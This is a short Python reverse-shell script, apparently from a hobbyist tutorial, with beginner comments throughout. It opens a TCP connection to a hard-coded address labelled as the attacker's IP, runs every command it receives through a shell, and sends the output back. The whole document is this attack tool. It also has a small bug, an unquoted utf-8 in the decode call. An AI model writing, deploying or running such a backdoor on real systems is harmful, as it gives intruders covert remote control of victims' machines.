#first import required ,modules 
import socket #For building Tcp connection
import subprocess #to  start the shell
import os  # module for basic operating system

os.system("clear || cls") #it clear the terminal screen 
def connect():
	s = socket.socket(socket.AF_INET, socket .SOCK_STREAM) #start a socket object s
	s.connect(('192.168.88.251', 8080)) #here we list the attaackers ip and the listening port 

	ter = 'terminate' #we use the following command to remove connection

	while True:#keep receiving command from the machine
		command = s.recv(1024) #read the first kb of the tcp socket

		if  len(command) >0:
			if ter.encode("utf-8") in command: # close the sockect and break theloop 
				s.close()
				break
			else:
				cmd = subprocess.Popen(command[:].decode(utf-8), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
				output_bytes = cmd.stdout.read() + cmd.stderr.read() #with help of send output or any error that occur 
				output_str =str(output_bytes, "utf-8")
				s.send(str.encode(output_str + str(os.getcwd()) + '>'))

def main():
	connect()

main()

